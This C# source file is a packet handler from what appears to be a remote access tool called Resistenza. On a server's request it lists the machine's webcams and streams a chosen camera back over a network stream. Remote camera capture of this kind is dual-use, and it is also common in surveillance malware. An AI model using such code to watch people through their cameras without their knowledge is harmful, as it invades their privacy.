using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Resistenza.Client.Logic;
using Resistenza.Common.Networking;
using Resistenza.Common.Packets.Logic;


namespace Resistenza.Common.Packets.Camera
{
    public class CamStartRequest
    {
        public string Type { get; set; }
        public bool ListDevices { get; set; }
        public bool StartTransmit { get; set; }
        public string NameTargetCam { get; set; }



        public CamStartRequest()
        {
            Type = this.GetType().ToString();
        }

        public async Task HandleAsync(SecureStream ServerStream, CancellationTokenSourceWithId CancelOperation, SemaphoreSlim Lock)
        {
            if (ListDevices)
            {
                List<string> DevicesNames = CamBroadcast.GetDevicesNames();

                var DevicesPacket = new CamListDevicesResponse();
                DevicesPacket.DevicesNames = DevicesNames;


                await Lock.WaitAsync();
                await ServerStream.SendPacketAsync(DevicesPacket);
                Lock.Release();
                

                

                
            }

            if (StartTransmit)
            {
                CamBroadcast Streamer = new CamBroadcast(ServerStream, Lock);
                try
                {
                    await Streamer.StartStreaming(NameTargetCam, CancelOperation);
                }
                catch (OperationCanceledException)
                {
                    CancelOperation.Token.ThrowIfCancellationRequested();
                    
                }
            }

           


        }
    }
}
